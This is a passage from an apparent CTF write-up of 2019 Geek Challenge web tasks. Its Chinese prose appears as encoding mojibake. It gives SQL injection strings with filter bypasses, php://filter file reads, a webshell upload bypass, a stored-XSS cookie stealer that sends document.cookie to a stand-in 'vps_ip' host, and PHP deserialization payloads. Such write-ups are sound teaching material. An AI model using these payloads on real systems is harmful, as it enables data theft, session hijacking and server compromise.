class="line">username=1%27union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema%3d&apos;geek&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101204140891.png" alt="image-20191101204140891"></p><p>æŸ¥l0ve1ysq1è¡¨çš„å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_schema%3d&apos;geek&apos;+and+table_name%3d&apos;l0ve1ysq1&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101204909589.png" alt="image-20191101204909589"></p><p>è·å–æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101213948365.png" alt="image-20191101213948365"></p><h2 id="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©-å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼"><a href="#æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©-å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼" class="headerlink" title="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©:å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼"></a>æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©:å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼</h2><p>bpæŠ“åŒ…</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031113746614.png" alt="image-20191031113746614"></p><p>å°è¯•æŠŠguestæ”¹æˆadmin</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031114019083.png" alt="image-20191031114019083"></p><p>æç¤ºæˆ‘ä»¬è¦ç»•è¿‡è¿™ä¸ªåˆ¤æ–­</p><p>ä¸¤ä¸ªç­‰å·ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯phpå¼±ç±»å‹</p><p>åˆ©ç”¨å­—ç¬¦ä¸²å’Œæ•°å­—çš„æ¯”è¾ƒå¼±ç‚¹</p><p>md5åŠ å¯†è‚¯å®šæ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å­—æ¯è½¬åŒ–ä¸ºæ•°å­—åˆ™ä¸º0ï¼Œå¦‚æœå‰ä¸¤ä¸ªå­—ç¬¦æ˜¯â€œ1wâ€ï¼Œé‚£ä¹ˆè½¬åŒ–ä¸ºæ•°å­—åˆ™ä¸º1.</p><p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨nameä¼ è¾“æ•°å­—ï¼Œçˆ†ç ´md5($flag)å‰é¢çš„æ•°å­—å³å¯ç»•è¿‡ã€‚</p><p>åœ¨jsonä¸­ï¼Œâ€œnameâ€:â€0â€æ˜¯å­—ç¬¦ä¸²ï¼Œâ€nameâ€:0 æ˜¯æ•°å­—</p><p>é…ç½®æµ‹è¯•å™¨</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031115415135.png" alt="image-20191031115415135"></p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031115443975.png" alt="image-20191031115443975"></p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031115642982.png" alt="image-20191031115642982"></p><p>æ”¹æˆ<a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">xml</a>å½¢å¼ï¼ŒConnect-Typeæ”¹æˆxml</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031122255387.png" alt="image-20191031122255387"></p><p>åˆ©ç”¨PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">ä¼ªåè®®</a>å’Œbase64åŠ å¯†è¯»å–æ–‡ä»¶å†…å®¹</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031124114147.png" alt="image-20191031124114147"></p><p>base64è§£ç å¾—åˆ°flag</p><h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œä¸‹è½½æºç </p><h2 id="Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼"><a href="#Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼" class="headerlink" title="Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼"></a>Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼</h2><p>ç»è¿‡æµ‹è¯•ä¸€äº›å…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œä½†é€šè¿‡åŒå†™å¯ä»¥ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username=-1&apos; oorrder bbyy 4-- &amp;password=123 //åˆ¤æ–­å­—æ®µ</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(schema_name)+frfromom+infoorrmation_schema.schemata%23&amp;password=123 //æŸ¥æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3d&apos;geek&apos;%23&amp;password=123  //æŸ¥è¡¨</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_schema%3d&apos;geek&apos;+aandnd+table_name%3d&apos;b4bsql&apos;%23&amp;password=123 //æŸ¥å­—æ®µ</span><br><span class="line"></span><br><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123   //è·å–æ•°æ®</span><br></pre></td></tr></table></figure><h2 id="ç¥ç§˜çš„ä¸‰å¶è‰"><a href="#ç¥ç§˜çš„ä¸‰å¶è‰" class="headerlink" title="ç¥ç§˜çš„ä¸‰å¶è‰"></a>ç¥ç§˜çš„ä¸‰å¶è‰</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°Secret.php</p><p>æ‰“å¼€Secret.php</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029215545399.png" alt="image-20191029215545399"></p><p>ç›´æ¥BPæŠ“åŒ…ï¼Œä¿®æ”¹Refererå¤´</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029220046452.png" alt="image-20191029220046452"></p><p>æç¤ºä½¿ç”¨Sycloveræµè§ˆå™¨</p><p>ä¿®æ”¹UAå¤´</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029220217949.png" alt="image-20191029220217949"></p><p>æ¥ç€æç¤ºåªèƒ½æœ¬åœ°è¯»å–</p><p>ä¿®æ”¹XFFå¤´</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029220337766.png" alt="image-20191029220337766"></p><p>å¾—åˆ°flag</p><h2 id="Eval-evil-code-Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚"><a href="#Eval-evil-code-Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚" class="headerlink" title="Eval evil code: Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚"></a>Eval evil code: Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚</h2><p>è¿™é‡Œæœ‰ä¸¤ä¸ªé™åˆ¶</p><p>ä¸€ã€æäº¤çš„æ¶æ„ä»£ç ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼ŒäºŒã€è¾“å…¥æ­£ç¡®çš„éªŒè¯ç </p><p>ç¬¬äºŒä¸ªå¥½è§£å†³ï¼Œç›´æ¥ç”¨md5<a href="https://0xcreed.github.io/2019/11/04/Md5Crack/" target="_blank" rel="noopener">ç¢°æ’è„šæœ¬</a></p><p>ç¬¬ä¸€ä¸ªå°±è¦åˆ©ç”¨PHPçš„ä¸°å¯Œçš„å†…ç½®å‡½æ•°æ¥æ„é€ å‚æ•°ã€‚</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191111224322216.png" alt="image-20191111224322216"></p><p>æ¥ç€è¯»å–readflag.php</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191111224528382.png" alt="image-20191111224528382"></p><p>å‚è€ƒskysecçš„<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">æ–‡ç« </a></p><h2 id="Jiangâ€˜s-Secret-æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼"><a href="#Jiangâ€˜s-Secret-æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼" class="headerlink" title="Jiangâ€˜s Secret:æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼"></a>Jiangâ€˜s Secret:æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼</h2><p>æ‰“å¼€ä¸»é¡µ</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231444787.png" alt="image-20191029231444787"></p><p>æŸ¥çœ‹æºç </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231426639.png" alt="image-20191029231426639"></p><p>è®¿é—®Archive_room.php</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231626206.png" alt="image-20191029231626206"></p><p>ç‚¹å‡»SECRET</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231659829.png" alt="image-20191029231659829"></p><p>å°è¯•BPæŠ“åŒ…</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231743833.png" alt="image-20191029231743833"></p><p>è®¿é—®secr3t.php</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231920584.png" alt="image-20191029231920584"></p><p>ç®€å•çš„ä»£ç å®¡è®¡</p><p>ç›´æ¥file=flag.php</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029232108090.png" alt="image-20191029232108090"></p><p>æ— æ³•ç›´æ¥è¯»å–flag.phpæ–‡ä»¶</p><p>åˆ©ç”¨phpä¼ªåè®®</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029232338502.png" alt="image-20191029232338502"></p><p>base64è§£ç </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029232357758.png" alt="image-20191029232357758"></p><h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><h2 id="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ"><a href="#ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ=="></a>ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ==</h2><p>ä¸Šä¼ æ­£å¸¸çš„å›¾ç‰‡</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030232940824.png" alt="image-20191030232940824"></p><p>Not imageï¼</p><p>å°è¯•ä¿®æ”¹Content-Type</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233157391.png" alt="image-20191030233157391"></p><p>ä¸Šä¼ æˆåŠŸï¼Œä½†å¹¶æ²¡æœ‰è¿”å›æ–‡ä»¶è·¯å¾„</p><p>ç›²çŒœä¸€æ³¢upload</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233348553.png" alt="image-20191030233348553"></p><p>æ­£ç¡®</p><p>å°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233555540.png" alt="image-20191030233555540"></p><p>å°è¯•æ”¹åç¼€</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233648512.png" alt="image-20191030233648512"></p><p>phtmlå¯ç»•è¿‡ ä½†ä¸èƒ½å‡ºç°&lt;?</p><p>åˆ©ç”¨  <code>&lt;script  language=&quot;php&quot;&gt;</code> ç»•è¿‡</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233844611.png" alt="image-20191030233844611"></p><p>ä¸Šä¼ æˆåŠŸ</p><p>èœåˆ€ è¿ä¸Š</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030234008757.png" alt="image-20191030234008757"></p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030234111964.png" alt="image-20191030234111964"></p><h2 id="Leixiaoâ€™s-blog-ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ"><a href="#Leixiaoâ€™s-blog-ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ" class="headerlink" title="Leixiaoâ€™s blog:  ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ"></a>Leixiaoâ€™s blog:  ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ</h2><p>è¿™é“é¢˜æ˜¯ç›´æ¥æ ¹æ®wpå¤ç°çš„ï¼Œå¯¹XSSæ²¡æœ‰å®æˆ˜è¿‡ï¼Œæ‰€ä»¥æ²¡å†™å‡ºæ¥ã€‚</p><p>XSSç¦»ä¸å¼€è¾“å…¥æ¡†ï¼Œæ‰€ä»¥BPæŠ“åŒ…ï¼Œä¿®æ”¹å„ä¸ªå‚æ•°çš„å€¼ï¼Œå‘ç°å¯†ä¿é—®é¢˜æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å°±æ„é€ ä¸€ä¸ªScriptçš„è¯­å¥ï¼Œæ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œä¹‹ååœ¨é‡ç½®å¯†ç é¡µé¢ï¼Œè¿™ä¸ªScriptè¯­å¥ä¼šæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¦‚æœç®¡ç†å‘˜è®¿é—®äº†è¿™ä¸ªé¡µé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¾—åˆ°ç®¡ç†å‘˜çš„cookieï¼Œä»è€Œä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ã€‚</p><p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶å°†å¯†ä¿é—®é¢˜ä¿®æ”¹æˆScriptè¯­å¥ <code>&quot;&gt;&lt;script src=//0x12345678/1.js&gt;</code></p><p>1.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location=<span class="string">'http://vps_ip/cookie'</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191117232732259.png" alt="image-20191117232732259"></p><p>æˆ‘ä»¬è®¿é—®dcz123ç”¨æˆ·çš„é‡ç½®å¯†ç é¡µé¢</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191117233119467.png" alt="image-20191117233119467"></p><p>å‘ç°æˆåŠŸè·³è½¬äº†</p><p>æ¥ä¸‹æ¥æŠŠ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://148.70.59.198:41258/forget.php?username=dcz123</span><br></pre></td></tr></table></figure><p>å‘ç»™report</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191117233239962.png" alt="image-20191117233239962"></p><p>ç®¡ç†å‘˜è®¿é—®åï¼Œå°±èƒ½åœ¨è®¿é—®æ—¥å¿—ä¸­å¾—åˆ°ç®¡ç†å‘˜çš„cookieäº†</p><h2 id="ååºåˆ—åŒ–1-0-socre10000æ‹¿åˆ°flag"><a href="#ååºåˆ—åŒ–1-0-socre10000æ‹¿åˆ°flag" class="headerlink" title="ååºåˆ—åŒ–1.0 : socre10000æ‹¿åˆ°flag"></a>ååºåˆ—åŒ–1.0 : socre10000æ‹¿åˆ°flag</h2><p>F12æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct working"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;score==<span class="number">10000</span>) &#123;</span><br><span class="line">            $flag = <span class="string">"******************"</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_GET[<span class="string">'exp'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿scoreçš„å€¼æ”¹æˆ10000è·å¾—flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $Student = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="keyword">echo</span> serialize($Student); </span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:7:"Student":1:&#123;s:5:"score";i:10000;&#125;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">148.70</span>.<span class="number">59.198</span>:<span class="number">42374</span>/?<span class="keyword">exp</span>=O:<span class="number">7</span>:%22Student%22:<span class="number">1</span>:&#123;<span class="keyword">s</span>:<span class="number">5</span>:%22score%22;i:<span class="number">10000</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191103221650185.png" alt="image-20191103221650185"></p><p><a href="https://www.freebuf.com/news/172507.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p><h2 id="åˆæ¥ä¸€åªçŒ«-æˆ‘å®¶çŒ«åå­—å«php"><a href="#åˆæ¥ä¸€åªçŒ«-æˆ‘å®¶çŒ«åå­—å«php" class="headerlink" title="åˆæ¥ä¸€åªçŒ«: æˆ‘å®¶çŒ«åå­—å«php"></a>åˆæ¥ä¸€åªçŒ«: æˆ‘å®¶çŒ«åå­—å«php</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106232809806.png" alt="image-20191106232809806"></p><p>æ¨æµ‹åº”è¯¥å­˜åœ¨å¤‡ä»½æ–‡ä»¶ï¼Œç›²çŒœ <code>www.zip</code></p><p>ä¸‹è½½åè§£å‹ï¼Œindex.phpä¸­æ¥å—selectå‚æ•°å¹¶ååºåˆ—åŒ–ã€‚</p><p>æŸ¥çœ‹class.php</p><p>æ ¹æ® <code>__destruct()</code>å‡½æ•° ååºåˆ—åŒ–è¦ä½¿$username=admin,$password=100.</p><p>ä½†æœ‰ä¸ªé—®é¢˜è¦ç»•è¿‡ <code>__wakeup()</code> ,è¿™é‡Œå¯ä»¥åˆ©ç”¨ CVE-2016-7124æ¼æ´ï¼Œ<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;    </span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'100'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line">$payload=<span class="string">"O:4:\"Name\":3&#123;s:14:\"\000Name\000username\";s:5:\"admin\";s:14:\"\000Name\000password\";s:3:\"100\";&#125;"</span>; <span class="comment">//2-&gt;3</span></span><br><span class="line">var_dump(urlencode($payload));<span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.14.40:8109/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106234145206.png" alt="image-20191106234145206"></p><p><a href="https://xz.aliyun.com/t/3674#toc-11" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p><p><a href="https://xz.aliyun.com/t/6454#toc-18" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p><h2 id="ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—"><a href="#ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—" class="headerlink" title="ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—"></a>ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—</h2><p>æ‰“å¼€é¢˜ç›®<a href="http://cxc.design/53a5734d6c99f89a/" target="_blank" rel="noopener">é“¾æ¥</a></p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163009923.png" alt="image-20191106163009923"></p><p>F12æŸ¥çœ‹æºç </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163100753.png" alt="image-20191106163100753"></p><p>æ˜æ˜¾æ˜¯hashæ‰©å±•å­—èŠ‚æ”»å‡»</p><p>åˆ©ç”¨BPæŠ“åŒ…</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163553918.png" alt="image-20191106163553918"></p><p>å¾—åˆ°Heartçš„å€¼ï¼š<code>6a1ce5f4dc83320710006a786ac82c17</code></p><p>åˆ©ç”¨hashpumpå¾—åˆ°lover</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163932674.png" alt="image-20191106163932674"></p><p>å°†å¾—åˆ°çš„å­—ç¬¦ä¸²è¿›è¡Œurlç¼–ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">$str=<span class="string">"syclover\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00nb"</span>;</span><br><span 